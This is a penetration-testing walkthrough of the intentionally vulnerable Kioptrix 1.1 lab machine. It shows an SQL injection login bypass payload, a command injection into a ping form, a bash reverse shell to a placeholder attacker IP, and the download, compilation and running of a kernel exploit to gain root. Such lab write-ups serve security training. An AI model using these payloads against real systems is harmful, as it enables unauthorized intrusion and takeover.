# Kioptrix 1.1 Walkthrough

## Target Information

- Target Machine: Kioptrix 1.1  
- Attacker Machine: Kali Linux  
- Goal: Gain root access  

---

## 1. Network Verification

First, we verified that the Kioptrix machine was reachable on our local network.

### ARP Scan

```bash
arp-scan -l
```

Alternatively, we could use:

```bash
netdiscover
```

After identifying the target IP address, we proceeded with enumeration.

---

## 2. Nmap Enumeration

We ran a full service and version scan:

```bash
nmap -A -p- -T4 <TARGET_IP>
```

### Open Ports Identified:

- 22/tcp – SSH (OpenSSH 3.9p1)
- 80/tcp – HTTP (Apache 2.0.52 - CentOS)
- 111/tcp – RPCBind
- 631/tcp – CUPS
- 3306/tcp – MySQL (unauthorized)

The scan revealed:

- OS: CentOS 4.5 (Final)
- Kernel: Linux 2.6.9

The kernel version is outdated and potentially vulnerable to privilege escalation exploits.

---

## 3. Web Enumeration & SQL Injection

Navigating to:

```
http://<TARGET_IP>/
```

We encountered a login page titled:

**Remote System Administration Login**

The login form did not provide any clear error feedback, suggesting possible SQL injection.

### SQLi Payload Used

In the username field:

```
' or 1=1 #
```

Password: any value

#### Explanation:

- `'` closes the existing SQL string
- `or 1=1` evaluates to TRUE
- `#` comments out the rest of the query

This successfully bypassed authentication and granted access to the administrative console.

---

## 4. Command Injection & Reverse Shell

After authentication, we were presented with a "Ping a Machine on the Network" form.

Testing input validation revealed command injection was possible.

### Proof of Command Execution

Input example:

```
127.0.0.1 | cat /etc/passwd
```

The server executed the command and returned system output.

---

### Reverse Shell Setup

On Kali (attacker machine):

```bash
nc -nvlp 4444
```

On the target (via command injection field):

```
127.0.0.1 | bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1
```

Once submitted, the reverse shell connected back to our listener.

We now had shell access as a low-privileged user.

---

## 5. Post-Exploitation Enumeration

We checked kernel and OS information:

```bash
uname -a
cat /etc/*-release
```

Output confirmed:

- Linux Kernel: 2.6.9
- CentOS release 4.5 (Final)

This kernel version is known to be vulnerable to local privilege escalation exploits.

---

## 6. Searching for Kernel Exploits

On Kali:

```bash
searchsploit 2.6.9
```

Then refined search:

```bash
searchsploit CentOS 4.5
```

We selected:

```
linux/local/9479.c
```

---

## 7. Preparing the Exploit

Download the exploit locally:

```bash
searchsploit -m linux/local/9479.c
```

Start a Python web server on Kali:

```bash
python3 -m http.server 8000
```

---

## 8. Transfer Exploit to Target

On the target shell:

```bash
cd /tmp
wget http://<ATTACKER_IP>:8000/9479.c
```

The file was successfully downloaded to `/tmp`.

---

## 9. Compile and Execute Exploit

Compile:

```bash
gcc 9479.c -o exploit
```

Make executable:

```bash
chmod +x exploit
```

Run:

```bash
./exploit
```

---

## 10. Privilege Escalation Achieved

After execution, we obtained a root shell.

Verify:

```bash
id
```

Output:

```
uid=0(root) gid=0(root)
```

We successfully achieved root access on Kioptrix 1.1.

---

# Conclusion

This machine demonstrated:

- SQL Injection authentication bypass
- Command injection via web application
- Reverse shell exploitation
- Kernel-based local privilege escalation
